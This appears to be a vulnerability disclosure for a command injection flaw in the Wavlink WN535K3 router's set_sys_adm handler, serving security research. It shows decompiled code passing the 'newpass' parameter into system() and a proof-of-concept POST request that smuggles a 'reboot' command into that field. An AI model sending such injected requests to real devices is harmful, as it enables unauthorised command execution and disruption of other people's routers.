## Wavlink WN535K3 command injection

### Overview

* Vendor: Wavlink

* Product: Wavlink WN535K3
* Version: 20191010

* Manufacturer's address：https://www.wavlink.com/en_us/product/WL-WN535K3.html
* Firmware download address ：https://www.wavlink.com/zh_cn/firmware/details/7.html

### Vulnerability details

Wavlink WN535K3 20191010 was found to contain a command injection vulnerability in the `set_sys_adm` function via the `newpass` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

```
1 FILE *__fastcall set_sys_adm(int a1)
2 {
3 	...
4 	v9 = (const char *)web_get("username", a1, 0);
5 	v12 = strdup(v9);
6 	v11 = (const char *)web_get("newpass", a1, 0);   //parameter control by user
7 	v13 = strdup(v11);
8 	if ( *v12 )
9 	{
10 	if ( *v13 )
11 	{
12   	sprintf(v20, "echo ‐n %s:%s > /tmp/tmpchpw && /usr/sbin/chpasswd < /tmp/tmpchpw && rm ‐fr /tmp/tmpchpw", v12, v13);
13   	system(v20);     //system call
14 		...
15 	}
16 ...
17 }
```

#### PoC

```
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: http://192.168.10.1
Connection: close
Referer: http://192.168.0.254
Cookie: session=562230006

page=set_sys_adm&username=foo&newpass=1;reboot;
```

